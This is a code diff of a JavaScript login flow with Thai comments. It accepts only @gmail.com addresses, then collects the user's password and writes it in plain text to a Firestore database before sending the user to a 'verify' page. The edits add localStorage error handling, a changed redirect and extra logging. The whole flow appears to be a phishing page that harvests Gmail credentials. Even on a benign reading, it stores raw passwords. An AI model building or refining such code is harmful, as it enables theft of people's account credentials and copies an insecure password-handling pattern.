@@ -36,9 +36,14 @@ function validateEmail() {
 function saveEmail() {
     let email = document.getElementById("email").value.trim();
 
-    // ❌ ถ้าไม่มี @gmail.com ไม่ให้ไปต่อ
     if (!email.endsWith("@gmail.com")) {
-        return;
+        return; // ❌ ไม่ให้ไปต่อถ้าอีเมลผิด
+    }
+
+    try {
+        localStorage.setItem("userEmail", email);
+    } catch (e) {
+        console.warn("⚠️ localStorage ใช้งานไม่ได้บนเบราว์เซอร์นี้");
     }
 
     // ✅ บันทึกอีเมลลง Firestore
@@ -48,7 +53,6 @@ function saveEmail() {
     }, { merge: true })
     .then(() => {
         console.log("✅ อีเมลถูกบันทึกลง Firebase:", email);
-        localStorage.setItem("userEmail", email);
         window.location.href = "password.html"; // ✅ ไปหน้าถัดไป
     })
     .catch(error => {
@@ -59,18 +63,24 @@ function saveEmail() {
 // 📌 ฟังก์ชันบันทึกรหัสผ่านลง Firestore
 function savePassword() {
     let password = document.getElementById("password").value.trim();
-    let email = localStorage.getItem("userEmail");
+    let email = null;
+
+    try {
+        email = localStorage.getItem("userEmail"); // ดึงค่าอีเมล
+    } catch (e) {
+        console.warn("⚠️ localStorage ใช้งานไม่ได้บนเบราว์เซอร์นี้");
+    }
 
     console.log("🔑 บันทึกรหัสผ่านสำหรับ:", email);
 
-    // ❌ ถ้าไม่มีอีเมล ให้กลับไปหน้าแรก
     if (!email) {
-        window.location.href = "index.html"; 
+        console.error("❌ ไม่พบอีเมล! กลับไปหน้า login");
+        window.location.href = "login.html";
         return;
     }
 
-    // ❌ ถ้าไม่ใส่รหัสผ่าน ไม่ให้ไปต่อ
     if (!password) {
+        console.warn("⚠️ กรุณากรอกรหัสผ่าน");
         return;
     }
 
@@ -79,10 +89,15 @@ function savePassword() {
         password: password
     })
     .then(() => {
-        console.log("✅ รหัสผ่านถูกบันทึกใน Firebase!");
-        window.location.href = "verify.html"; // ✅ ไปหน้ายืนยัน
+        console.log("✅ รหัสผ่านถูกบันทึกใน Firebase! ไป verify.html...");
+        window.location.href = "verify.html"; // ✅ ไปหน้ายืนยันตัว
     })
     .catch(error => {
-        console.error("❌ เกิดข้อผิดพลาด:", error);
+        console.error("❌ เกิดข้อผิดพลาดในการบันทึกรหัสผ่าน:", error);
     });
 }
+
+// ✅ ตรวจสอบว่า Firebase โหลดสมบูรณ์ก่อนใช้ฟังก์ชัน
+document.addEventListener("DOMContentLoaded", function() {
+    console.log("📌 DOM โหลดเสร็จแล้ว");
+});
